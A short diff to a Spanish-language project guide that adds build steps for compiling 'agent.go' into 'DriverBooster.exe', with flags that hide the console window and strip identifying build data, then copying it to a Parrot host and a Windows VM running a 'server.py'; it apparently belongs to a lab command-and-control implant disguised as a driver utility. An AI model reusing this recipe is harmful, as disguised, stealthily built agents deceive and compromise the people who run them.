@@ -2,6 +2,22 @@
 
 ---
 
+## 0. Compilar el proyecto rápido
+
+```bash
+# En Windows (host):
+build.bat
+# Genera: dist\DriverBooster.exe
+
+# Si build.bat falla:
+go build -ldflags="-s -w -H windowsgui -buildid=" -trimpath -o dist\DriverBooster.exe agent.go
+
+# Después de compilar, copiar a Parrot y a la VM Windows.
+# En Parrot, hacer git pull para traer server.py actualizado.
+```
+
+---
+
 ## 1. Modificar el algoritmo de cifrado o el modo de operación
 
 ### Cifrado actual: AES-256-GCM
